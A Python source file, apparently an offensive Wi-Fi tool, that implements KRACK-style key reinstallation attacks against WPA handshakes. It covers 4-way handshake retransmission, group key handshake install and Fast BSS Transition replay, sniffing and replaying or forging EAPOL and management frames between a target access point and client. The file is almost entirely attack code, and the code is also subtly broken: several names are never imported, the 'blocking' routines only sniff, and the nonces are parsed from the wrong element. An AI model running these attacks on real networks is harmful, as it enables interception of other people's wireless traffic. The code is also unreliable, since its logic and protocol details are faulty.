from scapy.all import (
    sniff, sendp, conf, get_if_list,
    Dot11, Dot11Auth, Dot11AssoReq, Dot11ReassoReq,
    Dot11Elt, EAPOL
)
from rich.console import Console
from rich.panel import Panel
from rich.prompt import Prompt, Confirm, IntPrompt
from loguru import logger
import time
import threading
import subprocess
import sys

console = Console()

# --- Network Utilities ---

def select_interface():
    """Allows the user to select a network interface."""
    interfaces = get_if_list()
    if not interfaces:
        console.print("[bold red]Error:[/] No network interfaces found.")
        return None

    interface_map = {str(i + 1): iface for i, iface in enumerate(interfaces)}

    console.print("[bold blue]Available Network Interfaces:[/bold blue]")
    for i, iface in enumerate(interfaces):
        console.print(f"{i + 1}. {iface}")

    while True:
        choice = console.input("Enter the number of the interface to use: ")
        if choice in interface_map:
            return interface_map[choice]
        else:
            console.print("[bold yellow]Invalid choice.[/bold yellow]")

def get_interfaces():
    """Gets a list of available network interfaces, handling OS differences."""
    if sys.platform == 'darwin':  # macOS
        try:
            # Use the 'networksetup' command to get Wi-Fi interfaces
            output = subprocess.check_output(["networksetup", "-listallhardwareports"]).decode("utf-8")
            interfaces = []
            for line in output.splitlines():
                if "Wi-Fi" in line:  # Look for Wi-Fi interfaces
                    parts = line.split()
                    for i in range(len(parts)):
                        if parts[i].startswith("en") and parts[i][2:].isdigit():
                            interfaces.append(parts[i])
            return interfaces
        except subprocess.CalledProcessError:
            console.print("[bold red]Error:[/] Could not get interface list using 'networksetup'.")
            return []
    else:  # Linux and other systems
        return get_if_list()

def select_interface_enhanced():
    """Allows the user to select a network interface with OS-specific enhancements."""
    interfaces = get_interfaces()
    if not interfaces:
        console.print("[bold red]Error:[/] No suitable network interfaces found.")
        return None

    console.print("[bold blue]Available Network Interfaces:[/bold blue]")
    for i, iface in enumerate(interfaces):
        console.print(f"{i + 1}. {iface}")

    while True:
        try:
            choice = IntPrompt.ask("Enter the number of the interface to use", choices=[str(i + 1) for i in range(len(interfaces))]) - 1
            return interfaces[choice]
        except ValueError:
            console.print("[bold yellow]Invalid choice.[/bold yellow]")

def scan_networks_linux(interface):
    """Scans for nearby Wi-Fi networks on Linux."""
    console.print(f"[bold green]Scanning for networks on interface '{interface}'...[/bold green]")
    try:
        # Scan for networks using the 'iwlist' command
        result = subprocess.run(['iwlist', interface, 'scan'], capture_output=True, text=True, check=True)
        output = result.stdout
        networks = []
        current_network = {}
        for line in output.splitlines():
            line = line.strip()
            if line.startswith('Cell '):
                if current_network:
                    networks.append(current_network)
                current_network = {}
                current_network['Address'] = line.split('Address: ')[1]
            elif line.startswith('ESSID:'):
                current_network['ESSID'] = line.split('ESSID:')[1].strip('"')
            elif line.startswith('Channel:'):
                current_network['Channel'] = line.split('Channel:')[1]
            elif 'Quality' in line and 'Signal level' in line:
                current_network['Quality'] = line.split('Quality=')[1].split(' ')[0]
                current_network['Signal'] = line.split('Signal level=')[1]
        if current_network:
            networks.append(current_network)

        return networks
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error during network scan:[/] {e}")
        return None

def scan_networks_macos(interface):
    """Scans for nearby Wi-Fi networks on macOS."""
    console.print(f"[bold green]Scanning for networks on interface '{interface}'...[/bold green]")
    try:
        # Scan for networks using the 'airport' command
        result = subprocess.run(['/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport', '-s'], capture_output=True, text=True, check=True)
        output = result.stdout
        networks = []
        for line in output.splitlines()[1:]:  # Skip header line
            parts = line.split()
            if len(parts) >= 8:
                network = {}
                network['ESSID'] = parts[0]
                network['Address'] = parts[1]
                network['Channel'] = parts[-1].split(',')[0]
                # Signal strength/quality is a bit more complex to parse
                network['Quality'] = 'N/A'
                network['Signal'] = parts[2] + ' dBm'
                networks.append(network)
        return networks
    except subprocess.CalledProcessError as e:
        console.print(f"[bold red]Error during network scan:[/] {e}")
        return None

def scan_networks(interface):
    """Scans for nearby Wi-Fi networks, handling OS differences."""
    if sys.platform == 'darwin':  # macOS
        return scan_networks_macos(interface)
    else:  # Linux and other systems
        return scan_networks_linux(interface)

def resolve_mac(ip_address, interface):
    """Resolves the MAC address for a given IP address."""
    arp_request = ARP(pdst=ip_address)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = srp(arp_request_broadcast, timeout=1, iface=interface, verbose=False)[0]
    if answered_list:
        return answered_list[0][1].hwsrc
    return None

def sniff_packets(interface, filter_string="", timeout=None):
    """Sniffs network packets."""
    try:
        return sniff(iface=interface, filter=filter_string, timeout=timeout)
    except Exception as e:
        console.print(f"[bold red]Error during packet sniffing:[/] {e}")
        return None

def send_packet(packet, interface):
    """Sends a network packet."""
    try:
        sendp(packet, iface=interface, verbose=False)
    except Exception as e:
        console.print(f"[bold red]Error sending packet:[/] {e}")

# --- Attacks ---

@logger.catch
def four_way_handshake_plaintext_retransmission(interface, target_ap_mac, target_client_mac):
    """Implements the 4-way handshake attack with plaintext retransmission."""
    logger.info(f"Starting 4-Way Handshake Plaintext Retransmission attack on {target_client_mac}")
    console.print(f"[bold blue]Starting 4-Way Handshake Plaintext Retransmission Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}, Target Client MAC: {target_client_mac}")

    # --- Step 1: Sniff for the initial 4-way handshake ---
    console.print("[yellow]Sniffing for the initial 4-way handshake...[/yellow]")
    handshake_packets = []
    def is_handshake(pkt):
        if pkt.haslayer(EAPOL):
            if pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac:
                handshake_packets.append(pkt)
                return True
            elif pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac:
                handshake_packets.append(pkt)
                return True
        return False

    sniff(iface=interface, lfilter=is_handshake, count=4, timeout=30)

    if len(handshake_packets) < 4:
        console.print("[bold red]Error:[/] Could not capture the complete 4-way handshake.")
        return False

    console.print("[green]Captured initial 4-way handshake.[/green]")

     # --- Step 2: Actively Block Message 4 ---
    console.print("[yellow]Actively blocking Message 4 from reaching the AP...[/yellow]")
    block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
    block_thread.daemon = True  # Set the thread as a daemon thread
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 3 ---
    console.print("[yellow]Waiting for the AP to retransmit Message 3...[/yellow]")
    retransmitted_message3 = None
    def is_retransmitted_message3(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3: # Key
                if pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac:
                    return True
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_message3, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message3 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Message 3.[/green]")
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Message 3.")
        return False

    # --- Step 4: Forward the retransmitted Message 3 to the client ---
    console.print("[yellow]Forwarding the retransmitted Message 3 to the client...[/yellow]")
    sendp(retransmitted_message3, iface=interface, verbose=False)
    console.print("[green]Retransmitted Message 3 forwarded.[/green]")

    console.print("[bold green]Attack potentially successful. Check for nonce reuse.[/bold green]")
    logger.info("4-Way Handshake Plaintext Retransmission attack potentially successful.")
    return True

def block_message_4(interface, target_ap_mac, target_client_mac):
    """Blocks 4-way handshake message 4 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                if pkt.addr1 == target_ap_mac and pkt.addr2 == target_client_mac:
                    logger.info(f"Message 4 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def four_way_handshake_encrypted_retransmission(interface, target_ap_mac, target_client_mac):
    """Implements the 4-way handshake attack with encrypted retransmission."""
    logger.info(f"Starting 4-Way Handshake Encrypted Retransmission attack on {target_client_mac}")
    console.print(f"[bold blue]Starting 4-Way Handshake Encrypted Retransmission Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}, Target Client MAC: {target_client_mac}")

    # --- Step 1: Capture initial handshake ---
    console.print("[yellow]Capturing initial 4-way handshake...[/yellow]")
    handshake_packets = []
    def is_handshake(pkt):
        if pkt.haslayer(EAPOL):
            return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac or pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac
        return False
    
    sniff(iface=interface, lfilter=is_handshake, store=True, timeout=20)

    if len(handshake_packets) < 4:
        console.print("[bold red]Error:[/] Could not capture the complete 4-way handshake.")
        return False
    
    console.print("[green]Captured initial 4-way handshake.[/green]")

    # --- Step 2: Block Message 4 ---
    console.print("[yellow]Actively blocking Message 4 from reaching the AP...[/yellow]")
    block_thread = threading.Thread(target=block_message_4, args=(interface, target_ap_mac, target_client_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 3 ---
    console.print("[yellow]Waiting for the AP to retransmit Message 3...[/yellow]")
    retransmitted_message3 = None
    def is_retransmitted_message3(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:
                return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_message3, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message3 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Message 3.[/green]")
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Message 3.")
        return False

    # --- Step 4: Exploit race condition ---
    console.print("[yellow]Attempting to exploit race condition by quickly retransmitting Message 3...[/yellow]")
    sendp(retransmitted_message3, iface=interface, verbose=False)
    console.print("[green]Retransmitted Message 3 sent.[/green]")

    # --- Step 5: Wait for encrypted retransmission of Message 3 ---
    console.print("[yellow]Waiting for encrypted retransmission of Message 3...[/yellow]")
    encrypted_retransmitted_message3 = None
    def is_encrypted_retransmitted_message3(pkt):
        if pkt.haslayer(Dot11WEP):
            return pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac
        return False

    encrypted_retransmitted_packets = sniff(iface=interface, lfilter=is_encrypted_retransmitted_message3, count=1, timeout=30)
    if encrypted_retransmitted_packets:
        encrypted_retransmitted_message3 = encrypted_retransmitted_packets[0]
        console.print("[green]Received encrypted retransmitted Message 3.[/green]")
    else:
        console.print("[bold red]Error:[/] No encrypted retransmission of Message 3 received.")
        return False

    # --- Step 6: Forward encrypted Message 3 to the client ---
    console.print("[yellow]Forwarding the encrypted retransmitted Message 3 to the client...[/yellow]")
    sendp(encrypted_retransmitted_message3, iface=interface, verbose=False)
    console.print("[green]Encrypted retransmitted Message 3 forwarded.[/green]")

    console.print("[bold green]Attack potentially successful. Check for nonce reuse.[/bold green]")
    logger.info("4-Way Handshake Encrypted Retransmission attack potentially successful.")
    return True

@logger.catch
def group_key_handshake_immediate_install(interface, target_ap_mac):
    """Implements the group key handshake attack with immediate key installation."""
    logger.info(f"Starting Group Key Handshake Immediate Install attack on AP {target_ap_mac}")
    console.print(f"[bold blue]Starting Group Key Handshake Immediate Install Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}")

    # --- Step 1: Sniff for Group Key Handshake ---
    console.print("[yellow]Sniffing for Group Key Handshake...[/yellow]")
    group_key_handshake_packets = []
    def is_group_key_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3: # Key
                key_info = eapol_layer.key_info
                # According to the KRACK paper, bit 13 indicates Group Key bit
                # and bit 8 indicates Key ACK (set in message 1, not in message 2)
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                if is_group:
                    group_key_handshake_packets.append(pkt)
                    return True
        return False
    
    sniff(iface=interface, lfilter=is_group_key_handshake, store=True, timeout=30)

    if len(group_key_handshake_packets) < 2:
        console.print("[bold red]Error:[/] Could not capture the complete Group Key Handshake.")
        return False

    console.print("[green]Captured Group Key Handshake.[/green]")

    # --- Step 2: Block Message 2 ---
    console.print("[yellow]Actively blocking Group Key Handshake Message 2...[/yellow]")
    block_thread = threading.Thread(target=block_group_key_message_2, args=(interface, target_ap_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 1 ---
    console.print("[yellow]Waiting for the AP to retransmit Group Key Handshake Message 1...[/yellow]")
    retransmitted_message1 = None
    def is_retransmitted_group_message1(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3: # Key
                key_info = eapol_layer.key_info
                # Message 1 has both Group Key and Key ACK bits set
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                if is_group and is_ack and pkt.addr2 == target_ap_mac:
                    return True
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_group_message1, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message1 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Group Key Handshake Message 1.[/green]")
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Group Key Handshake Message 1.")
        return False

    # --- Step 4: Wait for a broadcast frame from AP ---
    console.print("[yellow]Waiting for a broadcast frame from the AP...[/yellow]")
    broadcast_frame = None
    def is_broadcast_from_ap(pkt):
        return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"

    broadcast_frames = sniff(iface=interface, lfilter=is_broadcast_from_ap, count=1, timeout=30)
    if broadcast_frames:
        broadcast_frame = broadcast_frames[0]
        console.print("[green]Captured a broadcast frame from the AP.[/green]")
    else:
        console.print("[bold red]Error:[/] No broadcast frame captured from the AP.")
        return False

    # --- Step 5: Forward retransmitted Message 1 to a client ---
    console.print("[yellow]Forwarding the retransmitted Group Key Handshake Message 1 to a client...[/yellow]")
    # In a real attack, you would determine the client MAC dynamically
    target_client_mac = "aa:bb:cc:dd:ee:ff"  # Replace with a real client MAC
    retransmitted_message1.addr1 = target_client_mac
    sendp(retransmitted_message1, iface=interface, verbose=False)
    console.print("[green]Retransmitted Group Key Handshake Message 1 forwarded.[/green]")

    # --- Step 6: Replay the captured broadcast frame ---
    console.print("[yellow]Replaying the captured broadcast frame...[/yellow]")
    sendp(broadcast_frame, iface=interface, verbose=False)
    console.print("[green]Broadcast frame replayed.[/green]")

    console.print("[bold green]Attack potentially successful. Check for replay of broadcast frames.[/bold green]")
    logger.info("Group Key Handshake Immediate Install attack potentially successful.")
    return True

def block_group_key_message_2(interface, target_ap_mac):
    """Blocks group key handshake message 2 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                key_info = eapol_layer.key_info
                is_group = (key_info >> 13) & 1
                is_ack = (key_info >> 7) & 1
                if is_group and not is_ack:
                    logger.info(f"Group Key Message 2 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def group_key_handshake_delayed_install(interface, target_ap_mac):
    """Implements the group key handshake attack with delayed key installation."""
    logger.info(f"Starting Group Key Handshake Delayed Install attack on AP {target_ap_mac}")
    console.print(f"[bold blue]Starting Group Key Handshake Delayed Install Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}")

    # --- Step 1: Sniff for Group Key Handshake ---
    console.print("[yellow]Sniffing for Group Key Handshake...[/yellow]")
    group_key_handshake_packets = []
    def is_group_key_handshake(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3: # Key
                key_info = eapol_layer.key_info
                # Check for specific bits in key_info that identify Group Key Handshake messages.
                if (key_info >> 4) & 1:
                    group_key_handshake_packets.append(pkt)
                    return True
        return False
    
    sniff(iface=interface, lfilter=is_group_key_handshake, store=True, timeout=30)

    if len(group_key_handshake_packets) < 2:
        console.print("[bold red]Error:[/] Could not capture the complete Group Key Handshake.")
        return False

    console.print("[green]Captured Group Key Handshake.[/green]")

    # --- Step 2: Block Message 2 ---
    console.print("[yellow]Actively blocking Group Key Handshake Message 2...[/yellow]")
    block_thread = threading.Thread(target=block_group_key_message_2_delayed, args=(interface, target_ap_mac))
    block_thread.daemon = True
    block_thread.start()

    # --- Step 3: Wait for AP to retransmit Message 1 ---
    console.print("[yellow]Waiting for the AP to retransmit Group Key Handshake Message 1...[/yellow]")
    retransmitted_message1 = None
    def is_retransmitted_group_message1(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3: # Key
                key_info = eapol_layer.key_info
                if (key_info >> 4) & 1:
                    return pkt.addr2 == target_ap_mac
        return False

    retransmitted_packets = sniff(iface=interface, lfilter=is_retransmitted_group_message1, count=1, timeout=30)
    if retransmitted_packets:
        retransmitted_message1 = retransmitted_packets[0]
        console.print("[green]Received retransmitted Group Key Handshake Message 1.[/green]")
    else:
        console.print("[bold red]Error:[/] AP did not retransmit Group Key Handshake Message 1.")
        return False

    # --- Step 4: Capture and modify Message 2 ---
    console.print("[yellow]Waiting for a Group Key Handshake Message 2 to modify...[/yellow]")
    captured_message2 = None
    def is_group_message2(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3: # Key
                key_info = eapol_layer.key_info
                if (key_info >> 4) & 1 and pkt.addr1 != target_ap_mac:
                    return True
        return False

    captured_packets = sniff(iface=interface, lfilter=is_group_message2, count=1, timeout=30)
    if captured_packets:
        captured_message2 = captured_packets[0]
        console.print("[green]Captured Group Key Handshake Message 2.[/green]")
    else:
        console.print("[bold red]Error:[/] Could not capture Group Key Handshake Message 2.")
        return False

    # Modify the captured Message 2
    modified_message2 = captured_message2.copy()
    modified_message2.addr1 = target_ap_mac  # Set destination to AP
    modified_message2.addr2 = target_ap_mac  # Pretend it's from another client
    # Remove any existing checksums so scapy will recalculate them
    if modified_message2.haslayer(Dot11):
        del modified_message2.fcs
    if modified_message2.haslayer(IP):
        del modified_message2.chksum
    if modified_message2.haslayer(TCP):
        del modified_message2.chksum

    # --- Step 5: Send modified Message 2 to AP ---
    console.print("[yellow]Sending modified Group Key Handshake Message 2 to AP...[/yellow]")
    sendp(modified_message2, iface=interface, verbose=False)
    console.print("[green]Modified Message 2 sent to AP.[/green]")

    # --- Step 6: Wait for a broadcast frame from AP ---
    console.print("[yellow]Waiting for a broadcast frame from the AP...[/yellow]")
    broadcast_frame = None
    def is_broadcast_from_ap(pkt):
        return pkt.haslayer(Dot11) and pkt.addr2 == target_ap_mac and pkt.dst == "ff:ff:ff:ff:ff:ff"

    broadcast_frames = sniff(iface=interface, lfilter=is_broadcast_from_ap, count=1, timeout=30)
    if broadcast_frames:
        broadcast_frame = broadcast_frames[0]
        console.print("[green]Captured a broadcast frame from the AP.[/green]")
    else:
        console.print("[bold red]Error:[/] No broadcast frame captured from the AP.")
        return False

    # --- Step 7: Forward retransmitted Message 1 to a client ---
    console.print("[yellow]Forwarding the retransmitted Group Key Handshake Message 1 to a client...[/yellow]")
    # In a real attack, you would determine the client MAC dynamically
    target_client_mac = "aa:bb:cc:dd:ee:ff"  # Replace with a real client MAC
    retransmitted_message1.addr1 = target_client_mac
    sendp(retransmitted_message1, iface=interface, verbose=False)
    console.print("[green]Retransmitted Group Key Handshake Message 1 forwarded.[/green]")

    # --- Step 8: Replay the captured broadcast frame ---
    console.print("[yellow]Replaying the captured broadcast frame...[/yellow]")
    sendp(broadcast_frame, iface=interface, verbose=False)
    console.print("[green]Broadcast frame replayed.[/green]")

    console.print("[bold green]Attack potentially successful. Check for replay of broadcast frames.[/bold green]")
    logger.info("Group Key Handshake Delayed Install attack potentially successful.")
    return True

def block_group_key_message_2_delayed(interface, target_ap_mac):
    """Blocks delayed group key handshake message 2 packets."""
    def block_filter(pkt):
        if pkt.haslayer(EAPOL):
            eapol_layer = pkt.getlayer(EAPOL)
            if eapol_layer.type == 3:  # Key
                key_info = eapol_layer.key_info
                if (key_info >> 4) & 1:  # Group message 2
                    logger.info(f"Delayed Group Key Message 2 detected and blocked: {pkt.summary()}")
                    return True
        return False

    # Sniff with a timeout to avoid infinite blocking
    sniff(iface=interface, lfilter=block_filter, count=1, timeout=5)
    return block_filter

@logger.catch
def fast_bss_transition_attack(interface, target_ap_mac, target_client_mac):
    """Implements the Fast BSS Transition (FT) handshake attack."""
    logger.info(f"Starting Fast BSS Transition attack on AP {target_ap_mac}, Client: {target_client_mac}")
    console.print(f"[bold blue]Starting Fast BSS Transition (FT) Handshake Attack[/bold blue]")
    console.print(f"Target AP MAC: {target_ap_mac}, Target Client MAC: {target_client_mac}")

    # --- Step 1: Capture FT Authentication and Reassociation ---
    console.print("[yellow]Capturing Fast BSS Transition handshake...[/yellow]")
    ft_handshake_packets = []
    def is_ft_handshake(pkt):
        if pkt.haslayer(Dot11):
            # According to the paper, we need to capture:
            # 1. FT Authentication Request (client -> AP)
            # 2. FT Authentication Response (AP -> client)
            # 3. FT Reassociation Request (client -> AP)
            # 4. FT Reassociation Response (AP -> client)
            if pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac or \
               pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac:
                if pkt.haslayer(Dot11Auth) and pkt.subtype == 0:  # Authentication frame
                    # Check for FT Authentication algorithm (2)
                    if pkt[Dot11Auth].algo == 2:
                        ft_handshake_packets.append(pkt)
                        return True
                elif pkt.haslayer(Dot11ReassoReq) or pkt.haslayer(Dot11ReassoResp):
                    # Check for FT Information Element in reassociation frames
                    if pkt.haslayer(Dot11Elt) and any(ie.ID == 55 for ie in pkt[Dot11Elt:]):  # 55 is Mobility Domain IE
                        ft_handshake_packets.append(pkt)
                        return True
        return False
    
    sniff(iface=interface, lfilter=is_ft_handshake, store=True, timeout=30)

    if len(ft_handshake_packets) < 4:
        console.print("[bold red]Error:[/] Could not capture the complete FT handshake.")
        return False

    console.print("[green]Captured Fast BSS Transition handshake.[/green]")

    # --- Step 2: Identify FT Reassociation Request ---
    reassociation_request = None
    for pkt in ft_handshake_packets:
        if pkt.haslayer(Dot11ReassoReq) and pkt.addr2 == target_client_mac:
            reassociation_request = pkt
            break

    if reassociation_request is None:
        console.print("[bold red]Error:[/] Could not identify FT Reassociation Request in captured packets.")
        return False

    console.print("[green]Identified FT Reassociation Request.[/green]")

    # --- Step 3: Extract SNonce and ANonce ---
    snonce = None
    anonce = None
    for pkt in ft_handshake_packets:
        if pkt.haslayer(Dot11Auth):
            if pkt.addr2 == target_ap_mac:  # From AP
                # Extract ANonce from FT Authentication Response
                for ie in pkt[Dot11Elt:]:
                    if ie.ID == 55:  # Mobility Domain IE
                        anonce = ie.info[32:64]  # ANonce is typically 32 bytes
                        break
            elif pkt.addr2 == target_client_mac:  # From client
                # Extract SNonce from FT Authentication Request
                for ie in pkt[Dot11Elt:]:
                    if ie.ID == 55:  # Mobility Domain IE
                        snonce = ie.info[32:64]  # SNonce is typically 32 bytes
                        break

    if not snonce or not anonce:
        console.print("[bold red]Error:[/] Could not extract nonces from FT Authentication frames.")
        return False

    console.print("[green]Extracted nonces from FT Authentication frames.[/green]")

    # --- Step 4: Replay FT Reassociation Request ---
    console.print("[yellow]Replaying FT Reassociation Request to the AP...[/yellow]")
    # According to the paper, we need to:
    # 1. Keep the same SNonce
    # 2. Keep the same ANonce
    # 3. Increment the replay counter
    modified_request = reassociation_request.copy()
    
    # Update replay counter in the MIC IE
    for ie in modified_request[Dot11Elt:]:
        if ie.ID == 55:  # Mobility Domain IE
            replay_counter = int.from_bytes(ie.info[64:72], byteorder='little')
            new_counter = replay_counter + 1
            ie.info = ie.info[:64] + new_counter.to_bytes(8, byteorder='little') + ie.info[72:]
            break

    sendp(modified_request, iface=interface, verbose=False)
    console.print("[green]Replayed FT Reassociation Request.[/green]")

    # --- Step 5: Wait for encrypted frames ---
    console.print("[yellow]Waiting for encrypted data frames...[/yellow]")
    def is_encrypted_data(pkt):
        return pkt.haslayer(Dot11WEP) and \
               ((pkt.addr1 == target_client_mac and pkt.addr2 == target_ap_mac) or \
                (pkt.addr2 == target_client_mac and pkt.addr1 == target_ap_mac))

    encrypted_packets = sniff(iface=interface, lfilter=is_encrypted_data, count=1, timeout=30)
    if not encrypted_packets:
        console.print("[bold red]Error:[/] No encrypted frames captured.")
        return False

    console.print("[green]Captured encrypted frames.[/green]")
    console.print("[bold green]Attack potentially successful. Check for nonce reuse.[/bold green]")
    logger.info("Fast BSS Transition attack potentially successful.")
    return True